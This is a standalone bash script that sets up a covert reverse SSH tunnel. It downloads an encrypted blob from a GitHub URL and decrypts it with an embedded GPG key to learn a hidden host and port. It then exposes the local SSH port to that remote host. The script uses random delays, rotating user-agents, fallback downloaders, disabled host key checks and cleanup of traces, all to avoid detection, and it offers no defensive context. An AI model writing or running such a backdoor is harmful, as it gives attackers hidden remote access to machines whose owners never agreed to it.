
#!/usr/bin/env bash
set -euo pipefail

# Embedded GPG RSA private key (ASCII-armored)
GPG_KEY=$(cat <<'EOF'
-----BEGIN PGP PRIVATE KEY BLOCK-----

<YOUR FULL PRIVATE KEY BLOCK HERE>

-----END PGP PRIVATE KEY BLOCK-----
EOF
)

# Write key to temp file
KEY_FILE=$(mktemp)
echo "$GPG_KEY" > "$KEY_FILE"
chmod 600 "$KEY_FILE"

# Import key into temporary GPG homedir
GPG_HOME=$(mktemp -d)
export GNUPGHOME="$GPG_HOME"
gpg --batch --import "$KEY_FILE"

# Configuration
ENCRYPTED_URL="https://raw.githubusercontent.com/username/repo/main/encrypted.gpg"
PUBKEY_ID="tunneluser"
SSH_OPTS="-o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no"
USER_AGENTS=(
  "Mozilla/5.0 (X11; Linux x86_64)"
  "curl/7.68.0"
  "Wget/1.20.3"
  "python-requests/2.25.1"
)
DELAY_MIN=45
DELAY_MAX=180
RETRY=4

# Random delay
RND_DELAY=$(( RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN ))
sleep $RND_DELAY

# Random user-agent
UA=${USER_AGENTS[RANDOM % ${#USER_AGENTS[@]}]}

# Download function
fetch_blob() {
  local url=$1
  if command -v curl &>/dev/null; then
    curl -sSL -H "User-Agent: $UA" "$url"
  elif command -v wget &>/dev/null; then
    wget -qO- --header="User-Agent: $UA" "$url"
  else
    python3 -c "
import sys, urllib.request
req = urllib.request.Request('$url', headers={'User-Agent': '$UA'})
sys.stdout.buffer.write(urllib.request.urlopen(req).read())
"
  fi
}

# Attempt download with retries
for i in $(seq 1 $RETRY); do
  ENC_BLOB=$(fetch_blob "$ENCRYPTED_URL") && break
  sleep $((5 + RANDOM % 5))
  [ $i -lt $RETRY ] || { rm -rf "$KEY_FILE" "$GPG_HOME"; exit 1; }
done

# Save encrypted blob to temp file
ENC_FILE=$(mktemp)
echo "$ENC_BLOB" > "$ENC_FILE"

# Decrypt
DECRYPTED=$(gpg --batch --decrypt "$ENC_FILE" 2>/dev/null || {
  rm -rf "$KEY_FILE" "$GPG_HOME" "$ENC_FILE"
  exit 1
})

rm -rf "$KEY_FILE" "$GPG_HOME" "$ENC_FILE"

# Parse decrypted HOST:PORT
HOST=${DECRYPTED%%:*}
PORT=${DECRYPTED##*:}

# Create SSH command
SSH_CMD=(ssh -fN $SSH_OPTS -R "$PORT:localhost:22" "$PUBKEY_ID@$HOST")

# Clean up sensitive variables
unset ENC_BLOB DECRYPTED PUBKEY_ID ENCRYPTED_URL GPG_KEY

# Handle signals
trap 'exit 0' INT TERM

# Execute SSH tunnel
exec "${SSH_CMD[@]}"
